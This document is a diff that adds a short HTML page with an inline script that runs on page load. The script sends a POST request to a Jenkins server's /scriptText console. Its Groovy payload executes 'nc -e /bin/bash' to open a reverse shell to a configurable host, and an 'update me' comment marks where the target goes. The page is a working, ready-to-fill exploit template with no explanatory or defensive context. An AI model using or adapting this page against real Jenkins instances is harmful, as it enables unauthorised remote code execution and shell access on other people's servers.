@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+
+<html lang="en">
+    <body>
+        <script>
+            // update me
+            var command = 'nc -e /bin/bash 127.0.0.1 11235'
+            var jenkinsHost = '127.0.0.1';
+            var jenkinsPort = 8080;
+
+            // construct target and payload
+            var jenkinsUrl = 'https://' + jenkinsHost + ':' + jenkinsPort + '/scriptText';
+            var jenkinsPayload = `script=def command = '${command}';def proc = command.execute();proc.waitFor();`;
+
+            // construct and send the request
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open('POST', jenkinsUrl, true);
+            xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
+            xmlHttp.send(jenkinsPayload);
+        </script>
+    </body>
+</html>
